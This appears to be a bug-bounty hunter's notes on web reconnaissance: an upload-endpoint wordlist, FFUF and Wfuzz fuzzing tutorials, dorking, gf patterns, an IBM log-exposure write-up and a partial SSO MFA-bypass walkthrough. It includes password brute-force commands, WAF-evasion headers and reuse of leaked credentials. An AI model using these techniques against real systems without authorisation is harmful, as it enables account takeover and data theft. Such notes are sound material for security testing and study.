/api/uploadFile
/api/uploads
/api/v1/file-upload
/assets/filemanager
/assets/upload
/attachments/upload
/attachment/upload
/backend/upload
/cloud/upload
/cms/upload
/content/upload
/content/uploadFile
/controlpanel/upload
/dashboard/upload
/data/upload
/documents/upload
/dropbox/upload
/filebrowser
/filemanager
/filemanager_connector.php
/filemanager/upload
/file-storage/upload
/files/upload
/file/upload
/fileupload
/manage/files
/management/upload
/media/upload
/panel/upload
/public/upload
/sandbox/upload
/server/upload
/system/upload
/temp/upload
/upload
/upload.asp
/upload.aspx
/upload.cgi
/upload.php
/upload.jsp
/upload.jspx
/upload.do
/upload.action
/uploader
/upload_file
/upload-handler.php
/uploadify/upload.php
/uploads
/user/uploadFile
/v1/upload
/v2/upload
/webadmin/upload
/admin/media
/admin/file-upload
/app/upload
/assets/file-upload
/attachments/file-upload
/backend/filemanager
/backend/file-upload
/contentmanager/upload
/data/file-upload
/docs/upload
/dropzone/upload
/file_exchange/upload
/file_handler/upload
/file_manager/upload
/file_transfer/upload
/file_uploader/upload
/fileserver/upload
/file-system/upload
/gateway/upload
/img/upload
/images/upload
/media/file_upload
/mediacenter/upload
/medialibrary/upload
/media-manager/upload
/media-server/upload
/public_files/upload
/repo/upload
/repository/upload
/resources/upload
/shared/upload
/static/upload
/storage/upload
/temp_files/upload
/temp_storage/upload
/tmp/upload
/uploader/file
/user_files/upload
/vault/upload
/web_files/upload
/web_resources/upload
/webroot/upload
/uploads/temp
/uploads/new
/uploads/files
/fileserver/files
/upload_storage/files
/admin/file-storage
/admin/file-manager
/ajax/file-upload
/app/file-handler
/assets/media
/backend/file-exchange
/cms/file-upload
/content/filemanager
/controlpanel/file-upload
/dashboard/filemanager
/dashboard/file-handler
/data/filemanager
/data/file-handler
/documents/file-upload
/dropbox/filemanager
/filemanager/connector
/filemanager/handler
/file-storage/manager
/file-handler/connector
/files/handler
/files/exchange
/files/storage
/files/manager
/files/admin
/files/backend
/manage/filemanager
/manage/file-exchange
/management/file-storage
/media/handler
/panel/filemanager
/public/file-handler
/sandbox/file-upload
/server/filemanager
/system/file-upload
/temp/file-storage
/user/filemanager
/user/file-exchange
/v1/file-exchange
/v2/file-storage
/webadmin/filemanager
/webroot/file-upload
/web_files/handler
/shared_files/upload
/resources/filemanager
/docs/file-exchange
/img/file-upload
/images/filemanager
/mediacenter/file-handler
/medialibrary/filemanager
/media-server/file-exchange
/repo/file-upload
/repository/filemanager
/resources/file-upload
```

- Save above endpoints into any file endpoints.txt
- Save archived URLs from waymore

```bash
waymore -i domain.com -mode U -oU waymore_output.txt
grep -i -f endpoints.txt waymore_output.txt
```

---

#### üî®FFUF Fuzzing

**Web labs for FFUF and more**:

- [FFUF.me](http://ffuf.me) ‚Äî Great for beginners
- [HackXpert Labs](https://labs.hackxpert.com) ‚Äî Enjoy! ‚úç(‚óî‚ó°‚óî)


**my collection wordlist CMS :** Check out my collection of CMS wordlists here: [Captain Sharky‚Äôs WordList Collection](https://github.com/LUKE0101010/CaptinSHarkyWorldLiST). I‚Äôll be adding more of my recon wordlists from various bug hunters.

**Tip from Coffin**:  
Try this amazing FFUF oneliner that I mostly use to bypass WAFs for refined results, especially for information disclosure bugs. Use any wordlist:

```bash
ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-Host: localhost" -t 100 -r -o results.json
```

![[Pasted image 20250421135006.png]]

```
ffuf -w /path/to/subdomains.txt:SUB -w /path/to/endpoints.txt:FUZZ -u https://SUB/FUZZ -mc 200,302 -ac
```

### **Basic FFUF Commands**

<mark style="background: #ABF7F7A6;">BY COFFINXP</mark>
#### **Directory and File B**rute force

One of the most common uses of FFUF is finding hidden directories and files on a web server. You can do this by using the -u flag to set the target URL and the -w flag to provide a wordlist

```bash
ffuf -u https://example.com/FUZZ -w wordlist.txt
```

Here FUZZ acts as a placeholder that FFUF replaces with words from the wordlist to brute force directories or files

#### **POST Request with Wordlist**

```bash
ffuf -w wordlist.txt -u https://website.com/FUZZ -X POST
```

This command will fuzz the given url using each word in wordlist.txt while sending POST requests aiming to find hidden directories or endpoints

#### **Case Insensitive Matching**

Use -ic flag for a case insensitive search especially when you are **unsure about the server case sensitivity.** This means that it doesn't matter whether the characters in the search term are uppercase or lowercase both will be treated the same during the fuzzing process. You can also add the -c flag for colorful output

```
ffuf -u https://example.com/FUZZ -w wordlist.txt -ic -c
```

#ffuf
#### **File Extension Fuzzing**

To search for files with specific extensions use the -e flag to list the extensions you want to check

```
ffuf -u https://example.com/indexFUZZ -w wordlist.txt -e .php,.asp,.bak,.db
```

This command tests different extensions like .php, .asp, .bak and .db by adding them to each word in the wordlist. It helps to find hidden files with common extensions

![[Pasted image 20250314224557.png]]
				e.g.

#### **Recursive Fuzzing**

For fuzzing multiple levels of directories use the -recursion flag and specify the recursion depth using -recursion-depth.

```
ffuf -u https://example.com/FUZZ -w wordlist.txt -recursion -recursion-depth 3
```

#### Fltering Responses

FFUF allows you to filter responses based on specific criteria like HTTP status codes or response sizes you can use that by following command

```bash
ffuf -w wordlist.txt -u https://example.com/FUZZ -fc 404,500
```

This command excludes responses with status codes 404 or 500 or your given one

#### **Multi Wordlist Fuzzing**

```
ffuf -u https://example.com/W2/W1/ -w dict.txt:W1 -w dns_dict.txt:W2
```

This command fuzzes two parameters (W1 and W2) using separate two wordlists.

### **Subdomain and Virtual Host Fuzzing**

#### **Subdomain Fuzzing**

A key part of web security testing is finding hidden subdomains. FFUF can brute force subdomains by replacing the FUZZ keyword in the target URL

```
ffuf -w subdomains.txt -u https://FUZZ.example.com/
```

This command finds subdomains by fuzzing subdomains from subdomains.txt and replacing FUZZ with each one. It helps identify potential subdomains within a target domain

#### **Virtual Host (VHost) Fuzzing**

To detect virtual hosts use the -H flag to fuzz the Host header.

```
ffuf -w vhosts.txt -u https://example.com/ -H "Host: FUZZ.example.com"
```

This will search for virtual hosts like admin.example.com, test.example.com, and other subdomains

### **Fuzzing HTTP Parameters**

#### **Fuzzing GET Parameters**

To find potential GET parameters fuzz the query string in the URL:

```
ffuf -w wordlist.txt -u https://example.com/page.php?FUZZ=value
```

This command replaces FUZZ with words from the wordlist to test different GET parameters

#### **Fuzzing POST Parameters**

For POST requests use the ~={cyan}-X POST flag to specify the HTTP method and fuzz the POST data.
=~
```
ffuf -w wordlist.txt -u https://example.com/api -X POST -d 'FUZZ=value'
```

This will search for virtual hosts like admin.example.com, test.example.com, and other subdomains

### **Fuzzing HTTP Parameters**

#### **Fuzzing GET Parameters**

To find potential GET parameters fuzz the query string in the URL

```
ffuf -w wordlist.txt -u https://example.com/page.php?FUZZ=value
```

This command replaces FUZZ with words from the wordlist to test different GET parameters

#### **Fuzzing POST Parameters**

For POST requests use the -X POST flag to specify the HTTP method and fuzz the POST data.

```shell
ffuf -w wordlist.txt -u https://example.com/api -X POST -d 'FUZZ=value'
```

This is especially useful for testing APIs or login forms.

#### **POST Request Fuzzing (Login Bypass)**

```shell
ffuf -w passwordlist.txt -X POST -d "username=admin&password=FUZZ" -u https://www.example.com/login
```

FFUF sends POST requests to given url fuzzing the password parameter by replacing FUZZ with each entry from passwordlist.txt. This is useful for brute forcing login systems

#### PUT Request Fuzzing

```bash
ffuf -w /path/to/wordlist.txt -X PUT -u https://target.com/FUZZ -b 'session=abcdef'
```

This fuzzes with HTTP PUT requests using a session cookie (session=abcdef). Its useful for testing unauthorized file uploads or modifications

### **Advanced FFUF Method**

#### **Clusterbomb Mode**

```
ffuf -request req.txt -request-proto http -mode clusterbomb -w usernames.txt:HFUZZ -w passwords.txt:WFUZZ
```


In clusterbomb mode FFUF uses two wordlists: usernames.txt for HFUZZ and passwords.txt for WFUZZ. It combines each username with every password to test login attempts using the custom request structure from req.txt

```sql
ffuf -w users.txt:USER -w passwords.txt:PASS -u https://example.com/login?username=USER&password=PASS -mode clusterbomb
```

In clusterbomb mode FFUF tests combinations of usernames from users.txt and passwords from passwords.txt by replacing USER and PASS in the URL

#### **Pitchfork Mode**

```sql
ffuf -w users.txt:USER -w passwords.txt:PASS -u https://example.com/login?username=USER&password=PASS -mode pitchfork
```

In pitchfork mode FFUF takes each word from one list (e.g., usernames) and pairs it with the corresponding entry from another list (e.g., passwords). This mode offers a more controlled brute force test compared to clusterbomb mode

#### **Setting Cookies**

To include cookies in your requests use the -b flag.

```bash
ffuf -b "SESSIONID=abcd1234; USER=admin" -w wordlist.txt -u https://example.com/FUZZ
```

This is useful for authenticated fuzzing scenarios.

#### **Using Proxies**

You can route FFUF requests through a proxy like Burp Suite for deeper analysis

```perl
ffuf -x http://127.0.0.1:8080 -w wordlist.txt -u https://example.com/FUZZ
```

#### **Custom Header Fuzzing**

```bash
ffuf -w headers.txt -u https://example.com/ -H "X-Custom-Header: FUZZ"
```

This fuzzes the X-Custom-Header by replacing FUZZ with values from headers.txt helping find issues with custom HTTP headers.

#### **Fuzzing with Custom User-Agent**

Use the -H flag to modify custom user-agent headers in your requests

```bash
ffuf -u "https://example.com/FUZZ" -w wordlist.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
```

This is especially useful for bypassing restrictions or mimic specific browser behavior.

#### **Rate Limiting Bypass**

To avoid overwhelming the target server you can control the request rate using the -rate and -t flag

```bash
ffuf -w wordlist.txt -u https://example.com/FUZZ -rate 50 -t 50
```

This limits requests to 50 per second and threads to 50 helping prevent overwhelming the target or triggering rate limiting defenses

#### **Output Options**

FFUF provides several output formats including HTML, JSON, and CSV for saving the results

```bash
ffuf -w wordlist.txt -u https://example.com/FUZZ -o results.html -of html
```

This saves the results in an HTML file for easy analysis. You can also use the -of -all flag to save all output files at once

for wordlists? by coffinxp:  https://github.com/coffinxp/payloads/blob/main/fuzz.txt

#ffuf
### More Advanced Fuzzing Techniques

_Follow for more:

>[https://x.com/aarnavssaboo](http://x.com/aarnavssaboo)

# 1. Recursive Fuzzing (Hidden Layers)

Most stop at¬†`/admin/`, but secrets lie deeper.

```bash
ffuf -u https://target.com/FUZZ -w wordlist.txt -recursion
```

# 2. JavaScript Analysis + Fuzzing

Extract API endpoints from JavaScript before fuzzing

```bash
cat target.js | grep -oP '\/[a-zA-Z0-9_\-\/]+\?' | sed 's/?//' | sort -u > endpoints.txt    
ffuf -u https://target.com/FUZZ -w endpoints.txt
```

# 3. Parameter Fuzzing for Hidden Features

Find undocumented API parameters:

```bash
ffuf -u "https://target.com/profile?FUZZ=1" -w param_names.txt
```

Then test values for¬†**IDOR, SQLi, SSRF**

```bash
ffuf -u "https://target.com/profile?userid=FUZZ" -w tamper_values.txt
```

# 4. Parameter Fuzzing for Hidden Features

```bash
ffuf -u https://target.com/ -H "X-Forwarded-For: FUZZ" -w bypass_ips.txt
```

Some backends trust¬†`X-Forwarded-For`, leading to¬†**admin access bypass**.

# 5. Case-Sensitive Fuzzing

Many apps handle¬†`/Admin/`¬†and¬†`/admin/`¬†differently. Try

Use¬†`awk`¬†to generate variations for each word

```bash
cat wordlist.txt | awk '{print tolower($0); print toupper($0); print toupper(substr($0,1,1)) substr($0,2)}' | sort -u > case_variations.txt  
ffuf -u https://target.com/FUZZ -w case_variations.txt
```

This ensures¬†`/admin`,¬†`/Admin`,¬†`/ADMIN`, etc., are tested.

These are some of the most effective fuzzing techniques using which I have found multiple valids!

![](https://miro.medium.com/v2/resize:fit:875/1*7d9FzTqWy3vWeVZogs1Beg.jpeg)


---
## WFUZZ

#ffuf 

reosurce: https://medium.com/@harshleenchawla06/introduction-to-wfuzz-a5279f52adc3

_Wfuzz, which states for ‚ÄúWeb Application Fuzzer- command line tool written in python. It is used to discover common vulnerabilities in web applications through the method of fuzzing._


# Content:

- **Introduction to wfuzz**
- **Setup**
- **Wfpayload and Wfencode**
- **Docker run wfuzz**
- **Payloads**
- **Subdomain Fuzzing**
- **Directory Fuzzing**
- **Saving fuzzing output**
- **Basic wordlist filters**
- **Double fuzzing**
- Header fuzzing
- Encoders
- Storing and restoring fuzz from recipes
- Sessions in wfuzz

# Setup

To install :


```shell
pip3 install wfuzz

git clone https://github.com/xmendez/wfuzz.git  
cd wfuzz  
ls
```

![](https://miro.medium.com/v2/resize:fit:627/1*yAUwhhLg_RWRe2xPBiv27A.png)

![](https://miro.medium.com/v2/resize:fit:627/1*INnmzdccGsUiZ4in_yAZOw.png)

![](https://miro.medium.com/v2/resize:fit:627/1*INnmzdccGsUiZ4in_yAZOw.png)

The help menu to see all the options

```
wfuzz -h  
wfuzz --help

```
**Wfpayload and Wfencode**  
are compiled executables from the source installation, serving specific roles. Wfpayload is responsible for payload generation, while wfencode handles encoding. These tools can be used independently for efficiency.

```
./wfpayload -z range,0-15
```

![](https://miro.medium.com/v2/resize:fit:627/1*0zVtdYB_i0-qRmUhsUn2oQ.png)

```
apt --purge remove python3-pycurl && apt install libcurl4-openssl-dev libssl-dev
```

![](https://miro.medium.com/v2/resize:fit:627/1*Ll5_NMm03DUfTyF-HqpL4w.png)

When executing wfencode, a module designed for encoding input using a hash algorithm, no pycurl error is encountered

```css
./wfencode -e md5 ignite
```

# Docker run wfuzz

Wfuzz can be launched with Docker using the repository ghcr.io. The command can be executed by replacing the last variable ‚Äòwfuzz‚Äô.

```
docker run -v $(pwd)/wordlist:/wordlist/ -it ghcr.io/xmendez/wfuzz wfuzz
```

![](https://miro.medium.com/v2/resize:fit:627/1*cN1COHFJ4TO1icxoGscusg.png)

# Payloads

A payload in Wfuzz is a source of input data.

```
wfuzz -e payloads
```

![](https://miro.medium.com/v2/resize:fit:627/1*uglJVkUdMxWxi3dp-NnxzA.png)

The detailed view can also be looked at using the slice filter:

```
wfuzz -z help --slice "list"
```

# Subdomain Fuzzing

- c color codes the output response codes
- -Z specifies a URL to be input in scan mode and ignores any connection error
- -w specifies the wordlist use while subdomain bruteforce.

```
wfuzz -c -Z -w subdomains.txt http://FUZZ.vulnweb.com
```

The same result can be attained by including the subdomain list directly. Simply provide the payload (-z option) with the ‚Äòlist‚Äô input, formatted as ITEM1-ITEM2-ITEM3

```
wfuzz -z list,CVS-testphp-admin-svn http://testphp.vulnweb.com/FUZZ  
wfuzz -z list,CVS-testphp-admin-svn http://FUZZ.vulnweb.com/
```

![](https://miro.medium.com/v2/resize:fit:627/1*5EqC_OGBgQX1RNVGe1FkdA.png)

# Directory Fuzzing

Directories can be enumerated using wfuzz, similar to gobuster, by utilizing a provided wordlist. Achieve this by using the -w flag and specifying the path to the wordlist.
```

wfuzz -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ  

```
![](https://miro.medium.com/v2/resize:fit:627/1*ujU9d4SQ1o7toZOlI_Kn4w.png)

![](https://miro.medium.com/v2/resize:fit:627/1*OEtnxR9K6iDDyrKkRrSMkA.png)

- ‚Äìhc/sc CODE #Hide/Show by code in response
- ‚Äìhl/sl NUM #ide/Show by number of lines in response
- ‚Äìhw/sw NUM #ide/Show by number of words in response
- ‚Äìhc/sc NUM #ide/Show by number of chars in response

```
wfuzz -w wordlist/general/common.txt --sc 200,301 http://testphp.vulnweb.com/FUZZ
```

![](https://miro.medium.com/v2/resize:fit:627/1*KyIDSKzkE4XJEi9odttAFw.png)

# Saving fuzzing output

Wfuzz output can also be saved in multiple formats using the -f option.

- f option allows a user to input a file path and specify a printer (which formats the output) after a comma.

```
wfuzz -w wordlist/general/common.txt -f /tmp/output,csv --sc 200,301 http://testphp.vulnweb.com/FUZZ  
cat /tmp/output
```

![](https://miro.medium.com/v2/resize:fit:511/1*nVrDnUTpYtr6k7R5n1oFvA.png)


for any printer

```
wfuzz -e printers
```

![](https://miro.medium.com/v2/resize:fit:627/1*UsT-xR9f0yo7zLx3THdwkQ.png)

# Basic wordlist filters

Certain sub-arguments, prefixed with -z or -w filters, provide additional flexibility:

- -zP <params*>: Arguments for the specified payload
- -zD <default*>: Default parameter for the specified payload
- -zE <encoder*>: Encoder for the specified payload

```
wfuzz -z file --zD wordlist/general/common.txt --sc 200,301 http://testphp.vulnweb.com/FUZZ
```

![](https://miro.medium.com/v2/resize:fit:627/1*Ym49ELcVzJtMgJqQPPwnnQ.png)

To hide the HTTP response code 404

```
wfuzz -z file --zD wordlist/general/common.txt --hc 404 http://testphp.vulnweb.com/FUZZ
```

# Double fuzzing

Similar to fuzzing a parameter with the keyword ‚ÄúFUZZ,‚Äù multiple parameters can be fuzzed by specifying keywords:

- FUZ2Z: Represents the 2nd parameter
- FUZ3Z: Represents the 3rd parameter
- FUZ4Z: Represents the 4th parameter

Each parameter can be assigned its own wordlist. The first ‚Äú-w‚Äù corresponds to the first ‚ÄúFUZZ,‚Äù the second ‚Äú-w‚Äù corresponds to the second ‚ÄúFUZ2Z,‚Äù and so forth.

```bash
wfuzz -w wordlist/general/common.txt -w wordlist/general/common.txt --hc 404 http://testphp.vulnweb.com/FUZZ/FUZ2Z
```

# Header fuzzing

Header fuzzing in wfuzz allows the addition of HTTP headers to the outgoing requests, influencing the behavior of the entire web page. Custom headers can be fuzzed or injected, presenting opportunities for scenarios such as:

- HTTP Header Injections
- SQL Injections
- Host Header Injections

This capability provides a versatile approach for testing and identifying potential vulnerabilities in web applications.

```
wfuzz -z file,wordlist/general/common.txt -H "X-Forwarded-By: 127.0.0.1" -H "User-Agent: Firefox" http://testphp.vulnweb.com/FUZZ
```

![](https://miro.medium.com/v2/resize:fit:627/1*HhHAEuWPg27yzFWXPOXa1Q.png)

# Encoders

Various encoders are available in wfuzz. One such encoder we saw earlier was md5. Other encoders can be viewed by using ‚Äú-e‚Äù flag with encoders argument.

```
wfuzz -e encoders  
```

![](https://miro.medium.com/v2/resize:fit:627/1*Z_52inU1V1ffxRVvc7JD0Q.png)

# Storing and restoring fuzz from recipes

```
wfuzz -w wordlist/general/common.txt --dump-recipe /tmp/recipe --sc 200,301 http://testphp.vulnweb.com/FUZZ  
wfuzz --recipe /tmp/recipe
```

# Sessions in wfuzz

In wfuzz, a session refers to a temporary file that can be saved and subsequently revisited for re-processing and post-processing. This feature proves beneficial when modifications are required for previously saved results, or when an analyst needs to search for specific information in the results. The ‚Äú-oF‚Äù filter is used to save the session output to a file, facilitating efficient workflow management.

```bash
wfuzz --oF /tmp/session -z range,0-10 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ
```

Utilizing the ‚Äú-A‚Äù option for verbose output, a Python regex is applied in wfuzz to detect an SQL injection vulnerability. The regex, ‚Äúr.params.get=+‚Äô\‚Äô‚Äù, introduces an apostrophe (‚Äò) into the ‚Äòget‚Äô parameter for a raw response. This approach involves modifying parameters, fuzzing, and examining responses to identify potential vulnerabilities.

```
wfuzz -z range,1-5 --oF /tmp/session http://testphp.vulnweb.com/artists.php?artist=FUZZ  
wfuzz -z wfuzzp,/tmp/session --prefilter "r.params.get=+'\''" -A FUZZ
```

![](https://miro.medium.com/v2/resize:fit:627/1*ul8NWvbly_-YfX92U4WONw.png)

![](https://miro.medium.com/v2/resize:fit:627/1*oeB5-YRwcPh1-lav9lWO-w.png)

---

#### üï∏Google Dorking

```Dork
inurl:pathhere

#example:
inurl:/panel/upload -docs -forum -support -documentation -question -community
```

![None](https://miro.medium.com/v2/resize:fit:700/1*MwwErbQJiReBDQuZH4LdkQ.png)

#### üåêShodan Dorking

![None](https://miro.medium.com/v2/resize:fit:700/1*rVzm66IfgVgab6fBPqLlng.png)

----

## Example:

# How i hacked IBM

At first, I opened **shodan** and searched for: `**Org:'ibm' tomcat**`

I browsed some servers, but I didn‚Äôt find anything interesting, until I found this server and let‚Äôs call it `**x.x.x.x**`, when I ran ffuf on it, I found **‚Äúlogs‚Äù** as exposed endpoint. So I opened my browser to visit this endpoint, and as expected, I found more than one folder containing logs file for employees.

![](https://miro.medium.com/v2/resize:fit:700/1*ePNfNBSOgwLkUNh6UoVzoQ.png)

I opened some files to make sure that they actually contain information worth reporting, and indeed there were some tokens and emails for IBM employees.  
in fact, I checked the tokens but it were expired.  
However, these files are not supposed to be exposed, so I opened [**hackerone**](https://hackerone.com/ibm) to report this bug.

**Less than a day later I received this reply..**


![](https://miro.medium.com/v2/resize:fit:700/1*IwRFzOF7WWJTlphaQ4s4Mw.png)

They want a real exploitation from data in logs to triage my report.

So I opened the logs file to read them, and the thing that intrigued me was that the logs file of the today were there, so I collected all the logs file in one txt file to `**grep**` all tokens and tried them.

> **Note:** When I browsed through the logs file, I found admin control URL, and when I clicked on it, it showed me a message saying ‚Äú**There is a missing token**‚Äù. Then I sent this request to the burp and added a header called ‚Äú**token**‚Äù and I gave it a random value. Then the response changed to ‚Äú**The token is invalid or expired**‚Äù. I wanted to say this point so that you know how to I make sure this tokens are working or not.

![](https://miro.medium.com/v2/resize:fit:700/1*VzSW2V5J_AC_ONOHMT0wIA.png)

One of them was valid and I was able to get some information about an employee.

![](https://miro.medium.com/v2/resize:fit:700/1*34_4n6SfRxhqRYqIzeOeMA.png)

Also I found Credentials for **AWS** and **Azure**.

![](https://miro.medium.com/v2/resize:fit:700/1*DAnrAk3fCxrnhHk18cmnUQ.png)

Here I finished interim and I added an update to the report with what I found, and the report was triaged.

After that I decided to dive into the logs file to find something I could present on a separate report. And I found URL of **Services DevOps Commander** and when I opened it I tried to login with `**admin**` as username and `**pass**` as password, the surprise was that it was a true credential and I managed to get in.

![](https://miro.medium.com/v2/resize:fit:700/1*vFbjj2efo5LZwwmdQG7amQ.png)

> A small note: I later found that these credentials are being leaked in the logs file as clear text.

I browsed through the control panel, and I found credentials for services like **gitlab,** **jenkins** and many other services.

![](https://miro.medium.com/v2/resize:fit:700/1*8wH82MiSWeCbJ4ouddCb-g.png)

![](https://miro.medium.com/v2/resize:fit:700/1*VHDP6nFrVvTaPmigThLfeA.png)

I stopped there and I report this bug in a separate report, and the report was triaged.


----

The GF tool, created by Tomnomnom, is a wrapper around the `grep` command designed to help you search for specific patterns in code or text files more efficiently. It's particularly useful for bug bounty hunters and security researchers who need to identify potential vulnerabilities like XSS, SQLi, and more.

issue: https://github.com/1ndianl33t/Gf-Patterns/issues/1 "no such pattern"


GF it stands for ‚ÄúGrepping for patterns‚Äù

```
Commands : go install github.com/tomnomnom/gf@latest 
cd go/bin 
ls 
sudo cp gf /usr/bin 
gf -h 


cd ../../tools    or another directory
git clone  https://github.com/1ndianl33t/Gf-Patterns
mkdir ~/.gf 
sudo cp -r * ~/.gf
gf --list
```


Usage: [1ndianl33t/Gf-Patterns: GF Paterns For (ssrf,RCE,Lfi,sqli,ssti,idor,url redirection,debug_logic, interesting Subs) parameters grep](https://github.com/1ndianl33t/Gf-Patterns)

# JUST A REMINDER! üö®

#gf

**üö®It may not be considered a mistake by others, but it's my own perspective and experience about it.**

Let me explain to you what I want to say clearly, closely observe the `xss.json` file that is included in `Gf-Patterns`

![None](https://miro.medium.com/v2/resize:fit:700/1*wwIWz0rgpztHAopE08_ZLA.png)

			Credit: [github.com](https://github.com/1ndianl33t/Gf-Patterns/) (1ndianl33t ‚Äî GfPatterns)

Spend 2 minutes, what came to your mind?

Okay no problem, now ask yourself this question, "**Only these parameters are vulnerable to XSS or what?**"

Now what I did in the automation is that I collected the archived URLs via `waymore`, and instead of matching for these using `gf` tool, I removed those URLs that contain these parameters, and that's how I remove duplicates even in automation üòà

from: https://freedium.cfd/https://cybersecuritywriteups.com/how-i-got-cert-eu-hall-of-fame-e65b3e72510b


Now lets start with the normal information gathering:

_quick installation guide for **waybackurls:_**  (ensure you have golang installed first.)

#waybackurls

```Bash
-> go install github.com/tomnomnom/waybackurls@latest

-> cd go/bin  

-> sudo cp waybackurls /usr/local/bin  (so you can use it anywhere)

or you could simply go to "go/bin" and use ./waybackurls

usage:  cat file.txt | ./waybackurls > output.txt
```

quick **tip:**

```perl
waybackurls example.com | grep "/api/"
```


![None](https://miro.medium.com/v2/resize:fit:700/1*Czp-YNLKMxvXMzUCW6KddQ.png)

			get some data using waybackurls


![[Pasted image 20241204062905.png]]

![None](https://miro.medium.com/v2/resize:fit:700/1*ke5B0Yll-sBPEeyDgWIPBw.png)

**Sort and Remove Duplicates**: After fetching the URLs, you can sort them and remove duplicates using the `sort` and `uniq` commands:

```bash
sort enumerated_urls.txt | uniq > unique_urls.txt
```


**PATH 1:**

![[Pasted image 20241204063046.png]]
![[Pasted image 20241204063156.png]]

remember to also check the cloud version too: 

![[Pasted image 20241204064214.png]]

```
 look for this type of files for PII leaked info: 
 
 Configuration Files:

.conf 

.ini

.yaml

.json

.xml

Backup and Log Files:

.bak

.old

.log

.tmp

Database Files:

.sql

.db

.sqlite

.mdb

Source Code Files:

.php

.js

.html

.css

.py

.java

.rb

Sensitive Data Files:

.env

.htpasswd

.htaccess

.pem

.key

Document Files:

.doc

.docx

.pdf

.xls

.xlsx

.ppt

.pptx

Executable and Script Files:

.sh

.bat

.exe

.bin

Miscellaneous Files:

.zip

.tar

.gz

.rar     etc...
```


**PATH 2:**

```bash
cat allurls.txt | gf sqli | sed 's/=.*/=/' | sed 's/URl: //' | sort -u | tee output.txt
```

![None](https://miro.medium.com/v2/resize:fit:700/1*58EgBqZFJsmpDiaqVxbuVQ.png)

use gf to get sql parameters

- **`gf sqli`**: Filters the URLs to find those that may have SQL injection vulnerabilities.
- **`sed 's/=.*/=/'`**: Removes everything after the¬†`=`¬†sign in the URLs (leaving only the parameter names).
- **`sed 's/URl: //'`**: Removes the "URl: " prefix from each line.
- **`sort -u`**: Sorts the URLs and removes duplicates.
- **`tee output.txt`**: Saves the final list of URLs to¬†`output.txt`¬†while also displaying it in the terminal.

```bash
cat allurls.txt | gf xss | sed 's/=.*/=/' | sed 's/URl: //' | sort -u | tee output.txt
```

![None](https://miro.medium.com/v2/resize:fit:700/1*6F8qf_TejmxM_TVkd0NQ7w.png)

get some xss parameters

You can combine different tools to find and enumerate information effectively. In my case , I have combined ffuf with gf.

### Combining GF with FFUF for Fuzzing

`ffuf -u https://vulnweb.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -o output.txt && gf xss output.txt`

![None](https://miro.medium.com/v2/resize:fit:700/1*C5-164VlYOratmQKML4LDw.png)

			combine ffuf & gf

You can use¬†`Gf`¬†in combination with¬†`ffuf`, a fast web fuzzer, to discover endpoints and immediately grep them for vulnerabilities.

#ffuf 

#### Breaking Down the Command:

- **FFUF**: A tool that helps find hidden directories, files, or parameters on a website.
- **-u**¬†**[https://target.com/FUZZ](https://target.com/FUZZ)**: Tells FFUF to test different words at the "FUZZ" part of the URL.
- **-w /usr/share/wordlists/dirb/common.txt**: Uses a list of common directory and file names to replace "FUZZ."
- **-o output.txt**: Saves the results to a file called¬†`output.txt`.
- **&&**: If the FFUF command runs successfully, move on to the next step.
- **gf xss output.txt**: Uses the¬†`gf`¬†tool to search for cross-site scripting (XSS) patterns in the¬†`output.txt`¬†file.

**Combining**¬†**`gf`**¬†**with**¬†**`nuclei`**¬†**for Vulnerability Scanning:**

Combine¬†`gf`¬†to filter URLs for vulnerabilities, then use Nuclei to scan those filtered URLs, making your vulnerability scanning more targeted and efficient.

`subfinder -d target.com | httpx -silent | gf sqli | nuclei -t nuclei-templates/vulnerabilities/`

----

 other tools that could be implemented:

1. dnsgen ([https://bit.ly/asura04](https://bit.ly/asura04))
2. massdns ([https://bit.ly/asura05](https://bit.ly/asura05))

first i ran the assetfinder to find the sub domains

 `assetfinder -subs-only redacted.com > assetfinder.txt`

I usually run two or more tools for subdomains enumeration to gather as many possible subdomains as much. so i ran the subfinder.

`subfinder -d redacted.com | tee -a subfinder.txt`

then I used the tool¬†**anew**¬†to sort out the unique ones

`cat assetfinder.txt | anew subfinder.txt > sorteddomains.txt`

The next tool was the main tool which braught me the api key. The tool is called¬†**SubDomainizer**

python3 SubDomainizer.py -u¬†[http://www.redacted.com](http://www.example.com/)

![None](https://miro.medium.com/v2/resize:fit:700/1*CdghB0c5_mqGLjFtAnetTA.png)

To cross check the results i analyzed the source code for confirmation.

![None](https://miro.medium.com/v2/resize:fit:700/1*CfYWO9T63Qs9zJQU96rPfA.png)

and that's it. this was the simplest bug i have ever found!

to automate the process i wrote the a simple shell script to analyze each subdomain.

```bash
#!/bin/bash 
# Check if the file exists 
if [[ ! -f "subdomains.txt" ]]; then 
	echo "File subdomains.txt not found!" 
	exit 1
 fi
  # Read each subdomain from the file and run the SubDomainizer command
   while IFS= read -r subdomain; do
    # Check if the subdomain is not empty 
    if [[ -n "$subdomain" ]]; then
     echo "Running SubDomainizer for subdomain: $subdomain" 
     SubDomainizer -u "$subdomain" 
     fi 
     done < "subdomains.txt"
```

---

_Setting MFA in the account was mandatory for all Admin accounts hence this report was applicable & critical._

## SSO Exploitation

#SSO 

Normal authentication flow of application

Login to account from "sso.target.com/v2/login"
Application prompts for password & upon entering it will redirect to "sso.target.com/v2/login/mfa"
Enter the MFA code & hit submit.
The POST request will contain the code & the mfa id & account can be accessed. (The mfa id is a static & unique alphanumeric value which identifies each MFA set on an account.)
The Exploit

Go to login page & enter attacker's email id.
The application will redirect to page where password has to be entered.
Enter the password & login.
The application will redirect to "sso.target.com/v2/login/mfa"
MFA code will be sent to attacker's email id.
Note down the code & click on back button & return to login page.
Now enter the victim's email id.
Once again, the application will redirect to password prompt page.
